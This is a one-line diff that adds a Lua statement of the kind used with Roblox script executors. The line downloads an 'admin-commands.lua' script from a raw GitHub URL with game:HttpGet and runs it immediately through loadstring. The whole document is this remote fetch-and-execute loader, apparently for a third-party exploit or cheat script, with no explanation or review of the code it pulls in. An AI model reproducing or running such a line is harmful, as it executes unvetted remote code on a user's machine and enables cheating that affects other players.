@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Tyler2P/Roblox-Scripts/main/Global/admin-commands.lua", true))()
